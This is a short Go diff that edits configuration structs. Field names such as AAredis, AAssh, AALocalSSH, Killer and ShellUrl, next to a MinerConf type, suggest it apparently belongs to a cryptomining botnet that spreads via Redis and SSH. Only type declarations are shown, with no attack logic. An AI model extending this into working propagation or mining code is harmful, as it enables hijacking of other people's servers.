@@ -27,14 +27,17 @@ type MinerConf struct {
 }
 
 type CmdConf struct {
-	AAredis CmdConfDetail
-	AAssh   CmdConfDetail
-	Sh      []ShConf
-	Killer  []ProcConf
-	LKProc  []ProcConf
+	_msgpack   struct{} `msgpack:",omitempty"`
+	AALocalSSH CmdConfDetail
+	AAredis    CmdConfDetail
+	AAssh      CmdConfDetail
+	Sh         []ShConf
+	Killer     []ProcConf
+	LKProc     []ProcConf
 }
 
 type CmdConfDetail struct {
+	_msgpack   struct{} `msgpack:",omitempty"`
 	Id         int
 	Version    int
 	ShellUrl   string
